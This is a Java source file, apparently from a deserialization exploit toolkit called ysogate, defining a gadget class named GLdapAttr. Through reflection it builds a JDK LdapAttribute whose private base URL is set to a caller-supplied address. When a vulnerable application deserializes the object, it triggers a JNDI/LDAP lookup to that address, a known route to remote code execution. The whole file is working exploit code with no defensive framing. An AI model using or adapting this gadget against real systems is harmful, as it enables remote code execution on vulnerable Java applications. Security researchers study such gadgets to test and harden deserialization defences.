package com.h2tg.ysogate.payloads.gadgets.jdk;

import com.h2tg.ysogate.payloads.gadgets.base.IGetter2Lookup;

import javax.naming.CompositeName;
import javax.naming.directory.BasicAttribute;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;

public class GLdapAttr implements IGetter2Lookup
{

    @Override
    public Object getter2Lookup(String url) throws Exception
    {
        try{
            Class clazz = Class.forName("com.sun.jndi.ldap.LdapAttribute");
            Constructor clazz_cons = clazz.getDeclaredConstructor(new Class[]{String.class});
            clazz_cons.setAccessible(true);
            BasicAttribute la = (BasicAttribute)clazz_cons.newInstance(new Object[]{"exp"});
            Field bcu_fi = clazz.getDeclaredField("baseCtxURL");
            bcu_fi.setAccessible(true);
            bcu_fi.set(la,url);
            CompositeName cn = new CompositeName();
            cn.add("a");
            cn.add("b");
            Field rdn_fi = clazz.getDeclaredField("rdn");
            rdn_fi.setAccessible(true);
            rdn_fi.set(la, cn);
            return la;
        }catch (Exception e){
            e.printStackTrace();
        }
        return null;
    }
}
